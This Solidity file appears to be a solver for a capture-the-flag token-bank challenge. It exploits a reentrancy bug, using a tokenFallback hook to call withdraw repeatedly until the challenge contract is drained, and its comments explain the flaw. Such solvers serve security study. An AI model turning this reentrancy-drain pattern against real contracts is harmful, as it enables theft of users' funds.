// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.4;

import "hardhat/console.sol";

abstract contract ISimpleERC223Token {
    // Track how many tokens are owned by each address.
    mapping(address => uint256) public balanceOf;

    function transfer(address to, uint256 value)
        external
        virtual
        returns (bool success);
}

abstract contract ITokenBankChallenge {
    ISimpleERC223Token public token;
    mapping(address => uint256) public balanceOf;

    function isComplete() external view virtual returns (bool);

    function withdraw(uint256 amount) external virtual;
}

contract TokenBankSolver {
    ITokenBankChallenge public challenge;

    constructor(address challengeAddress) public {
        challenge = ITokenBankChallenge(challengeAddress);
    }

    function deposit() external payable {
       uint256 myBalance = challenge.token().balanceOf(address(this));
       challenge.token().transfer(address(challenge), myBalance);
    }

    function solve() external payable {
        withdraw();

        require(challenge.isComplete(),"challenge not completed");
    }

    function tokenFallback(
        address from,
        uint256 value,
        bytes calldata
    ) external {
        require(
            msg.sender == address(challenge.token()),
            "not from original token"
        );

        if (from != address(challenge)) return;
        
        withdraw();
    }

    
    function withdraw() public {
        // this one is the bugged one, does not update after withdraw
        uint256 myInitialBalance = challenge.balanceOf(address(this));
        // this one from the token contract, updates after withdraw
        uint256 challengeTotalRemainingBalance = challenge.token().balanceOf(address(challenge));
        // are there more tokens to empty?
        bool keepRecursing = challengeTotalRemainingBalance > 0;

        if (keepRecursing) {
            // can only withdraw at most our initial balance per withdraw call
            uint256 toWithdraw = myInitialBalance < challengeTotalRemainingBalance
                ? myInitialBalance
                : challengeTotalRemainingBalance;
            challenge.withdraw(toWithdraw);
        }
    }
}